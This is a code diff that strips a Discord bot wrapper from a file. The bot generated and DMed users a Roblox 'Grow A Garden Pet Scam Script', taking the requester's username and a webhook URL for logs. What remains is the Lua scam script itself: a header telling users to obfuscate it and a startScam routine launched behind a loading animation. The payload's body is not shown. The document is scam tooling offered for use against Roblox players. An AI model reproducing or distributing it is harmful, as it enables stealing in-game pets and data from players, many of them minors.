@@ -1,32 +1,5 @@
-import discord
-from discord import app_commands
-from discord.ext import commands
-import io
-import os
-
-GUILD_ID = 1381683743789682718  # Replace with your guild/server ID (int)
-
-intents = discord.Intents.default()
-bot = commands.Bot(command_prefix="/", intents=intents)
-
-@bot.event
-async def on_ready():
-    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
-    try:
-        guild = discord.Object(id=GUILD_ID)
-        synced = await bot.tree.sync(guild=guild)
-        print(f"Synced {len(synced)} commands to guild ID {GUILD_ID}")
-    except Exception as e:
-        print(f"Error syncing commands: {e}")
-
-@bot.tree.command(name="generatescript_garden", description="Generate Grow A Garden Pet Scam Script (OP)")
-@app_commands.describe(username="Your Roblox username", webhook="Webhook URL to send logs")
-@app_commands.guilds(discord.Object(id=GUILD_ID))
-async def generatescript_garden(interaction: discord.Interaction, username: str, webhook: str):
-    await interaction.response.defer(ephemeral=True)
-    
-    script = f'''-- GROW A GARDEN SCRIPT
-    -- OBFUSCATE IT AT [https://discord.gg/79FmBBqvx8]
+-- GROW A GARDEN SCRIPT
+-- OBFUSCATE IT AT [https://discord.gg/79FmBBqvx8]
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 local StarterGui = game:GetService("StarterGui")
@@ -216,19 +189,3 @@ local function startScam()
 end
 
 animateLoading(startScam)
-'''
-
-    file = discord.File(io.StringIO(script), filename=f"GrowAGardenScam_{username}.lua")
-
-    try:
-        await interaction.user.send(content=f"Here's your ultra OP Grow A Garden Pet Scam script for **{username}**:", file=file)
-        await interaction.followup.send("Script sent via DM! Check your messages.", ephemeral=True)
-    except discord.Forbidden:
-        await interaction.followup.send("Can't DM you. Check your privacy settings.", ephemeral=True)
-
-# Run the bot with your token from GitHub secrets
-token = os.getenv("DISCORD_TOKEN")
-if not token:
-    print("ERROR: DISCORD_TOKEN environment variable not found!")
-else:
-    bot.run(token)
